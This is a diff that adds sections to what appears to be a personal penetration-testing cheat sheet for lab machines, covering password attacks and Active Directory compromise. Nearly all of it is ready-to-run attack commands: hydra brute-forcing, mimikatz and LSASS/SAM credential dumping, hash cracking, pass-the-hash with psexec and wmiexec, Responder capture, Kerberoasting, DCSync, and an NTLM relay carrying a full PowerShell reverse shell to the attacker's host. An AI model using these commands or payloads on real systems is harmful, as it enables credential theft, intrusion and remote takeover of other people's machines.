@@ -603,8 +603,222 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - `python2 44976.py`  
   - `http://192.168.171.52/cmsms/uploads/shell.php?cmd=cat /home/flag.txt`    
 
+# Password attack  
+- SSH
+  `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201`
+- RDP
+  `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`  
+- http POST login
+  `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`
+- Obtain hashes
+  - `.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
+  - `.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit`
+  - `rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump  lsass.exe C:\temp\lsass.dmp full` #LSASS Memory Dump + PyPyKatz
+  - Extracting SAM & SYSTEM Hives (local disk hashes)
+    ```
+    reg save HKLM\SAM C:\temp\SAM 
+    reg save HKLM\SYSTEM C:\temp\SYSTEM
+
+    secretsdump.py -sam /home/kali/uploads/sam -system /home/kali/uploads/system LOCAL   
+    ```
+- crack NTLM 1000
+  `hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`    
+- mutating wordlist
+  - [rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
+    - `ls -la /usr/share/hashcat/rules/`  
+    - Append character X to end: $1$2
+    - Prepend character X to front: ^2^1
+    - Capitalize the first character, lowercase the rest: c
+    - Do nothing: :
+    - `echo \$1 > demo.rule` append 1 to password
+      `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force`  #crack MD5 0
+      ```
+      $1 c
+      Password1
+      Iloveyou1
+      
+      $1
+      c
+      password1
+      Password
+
+      $1 c $!
+      $2 c $!
+      $1 $2 $3 c $!
+      Computer123!
+
+      #Passwords need 3 numbers, a capital letter and a special character
+      c $1 $3 $7 $!
+      c $1 $3 $7 $@
+      c $1 $3 $7 $#
+      Umbrella137!
+      ```
+- `hash-identifier "4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7"`
+- Password manager (KeePass)
+  ```
+  Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue #search DB
+  keepass2john Database.kdbx > keepass.hash #format the hash
+  nano keepass.hash #remove the Prepand "Database"
+  hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force  #crack KeePass 13400
+  ```
+- ssh private key passphrase
+  ```
+  ssh2john id_rsa > ssh.hash  #format the hash
+
+  cat ssh.hash: id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e77373682... #E.g hash text
+
+  sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf' #add the hash rule to JtR config
+  john --wordlist=ssh.passwords --rules=sshRules ssh.hash #crack
+
+  rm ~/.ssh/known_hosts
+  chmod 600 id_rsa
+  ssh -i id_rsa -p 2222 dave@192.168.50.201 #login
+  ```
+- Passing NTLM (User + Hash)
+  - scenario: user from FILES01 extract admin hash and authenticate to FILES02 SMB share  
+  ```
+  .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
+
+  #option 1: SMB
+  smbclient \\\\192.168.139.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+  smb: \> get secrets.txt
+  
+  #option 2: psexec
+  impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+  C:\Windows\system32> hostname
+  ```
+- Net-NTLMv2 challenge–response hash (cannot run Mimikatz as an unprivileged user )
+  - Only exists during authentication traffic SMB
+  - connect to bind shell on port 4444  
+    `nc 192.168.139.211 4444`  
+    `C:\Windows\system32> whoami`  
+  - start responder on interface tap0
+    `kali@kali:~$ sudo responder -I tap0`  
+  - create an SMB connection to our kali
+    `C:\Windows\system32>dir \\<kali>\test`
+  - responder capturing the Net-NTLMv2 hash of paul.
+    [SMB] NTLMv2-SSP Hash :paul::FILES01:1f9d4c51f6e74653:795F138EC6
+  - `hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force`  #crack Net-NTLMv2 5600
+- Relaying Net-NTLMv2 (cannot run Mimikatz as an unprivileged user + failed to crack Net-NTLMv2 hash)
+  - Starting ntlmrelayx for a Relay-attack targeting FILES02
+    ```
+    pwsh
+
+    $Text = '$client = New-Object System.Net.Sockets.TCPClient("<kali>",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+    $EncodedText =[Convert]::ToBase64String($Bytes)
+    $EncodedText
+
+    #new terminal
+    impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c "powershell -enc JABj...=="
+    ```
+  - Starting a Netcat listener on port 8080 `nc -nvlp 8080`
+  - create an SMB connection
+    ```
+    kali@kali:~$  nc 192.168.50.211 5555
+    C:\Windows\system32>dir \\192.168.119.2\test
+    ```
+  - receive an incoming connection in our ntlmrelayx tab
+- Windows credential guard
+  - Gain access to SERVERWK248 machine as CORP\Administrator (pass the hash)
+    `impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248`  
+
 # Remote to other machines
 
+# Active directory  
+[Initial Access]
+      │
+      ▼
+[Low-Priv User on Workstation]
+      │  (exploit vulnerable service, password guessing, phishing)
+      ▼
+[Local Admin on Host]
+      │
+      ├─ Tools:
+      │    • Mimikatz (sekurlsa::logonpasswords, lsadump::sam)
+      │    • WinPEAS / LinPEAS (privilege enumeration)
+      │    • JuicyPotato / RottenPotatoNG (token impersonation)
+      │
+      ▼
+[Dump Local & Cached Credentials]
+      │
+      ├─ Potential data:
+      │    • Local NTLM hashes
+      │    • Cached Domain User creds
+      │
+      ▼
+[Domain User / Service Account]
+      │
+      ├─ Techniques:
+      │    • Kerberoasting (extract service account hashes)
+      │    • Pass-the-Hash / Pass-the-Ticket (move laterally)
+      │
+      ▼
+[Access to Target DC or High-Priv Domain Host]
+      │
+      ├─ Tools:
+      │    • Mimikatz DCSync
+      │    • Impacket secretsdump.py
+      │
+      ▼
+[Domain Admin Compromise]
+      │
+      ├─ Outcome:
+      │    • Full AD control
+      │    • Dump all user hashes
+      │    • Pivot to other hosts at will
+      ▼
+[Lab / Network Fully Compromised]
+
+# Top tools and command  
+1. **hashcat**: Cracking NTLM / Kerberos hashes  
+   `hashcat -m 1000 hash.txt rockyou.txt`  
+3. **Mimikatz** (Credential Dump)  
+   `C:\tools\mimikatz\ > .\mimikatz.exe`  
+   `mimikatz # privilege::debug`  #elevate privileges
+   -  `sekurlsa::logonpasswords`  #dump live credentails from LSASS
+   -  `lsadump::sam`              #dump local SAM hashes
+   -  `lsadump::dcsync /domain`   #dump all domain hashes via DCSync 
+4. **impacket** (Windows/AD/SMB/Kerberos)  
+   `kali@kali:~$ /usr/bin/impacket-wmiexec xxx`  
+   - **psexec**: Executes commands remotely (get shell) using SMB & admin credentials  
+     `Impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`    
+   - **wmiexec**: Alternative to psexec if SMB blocked  
+     `impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248`  
+     `impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.127.72`  
+   - **GetNPUsers**: Retrieve user account hashes without knowing their password (Do not require Kerberos preauthentication-disabled)    
+     `impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete`
+   - GetUserSPNs: Retrieve Kerberos service account hashes that can be cracked offline (**Kerberoasting attack**)    
+     `impacket-GetUserSPNs -request -dc-ip <DC> corp.com/<domain_user>`
+   - secretsdump: dump credentials (local or domain)  
+     `impacket-secretsdump -just-dc-user <user> corp.com/<admin>:"<Password>"@<targetDomain>` #NTLM hash of user
+     `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL` #backup copies of DC files (ntds.dit + SYSTEM hive)
+   - ntlmrelayx: Relay captured NTLM auth to another host  
+     `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.139.212 -c "powershell -enc JABjAGw...`
+   - mssqlclient  
+     `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`
+5. **crackmapexec**: SMB / AD enumeration & attacks  
+   - `kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success`
+6. PsExec: Remote execution with admin  
+   - `PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i \\<DC1> -u corp\<user> -p <password> cmd`  
+   - `PS C:\tools\SysinternalsSuite> .\PsExec.exe \\<DC1> cmd`  
+   - `C:\Tools\SysinternalsSuite> psexec.exe \\192.168.50.70 cmd.exe`
+8. WinRM: Remote shell via WinRM  
+   - evil-winrm -i 192.168.145.220 -u daveadmin -p "qwertqwertqwert123\!\!"  
+   - `Enter-PSSession -ComputerName <CLIENTWK220> -Credential $cred`
+      ```
+      PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+      PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+      PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+      PS C:\Users\dave> Stop-Transcript
+      ```
+9. nmap: Port / service scanning  
+    - `nmap -sC -sV -p- <target>`  
+10. enum4linux: Linux AD / SMB enumeration  
+    - ·enum4linux -a <target>·
+
+      
 # Ports scan
   - Kali port:
     - 80, 443, 53 (reverse shell). Second choice: 4444, 1234 (firewall might block)  
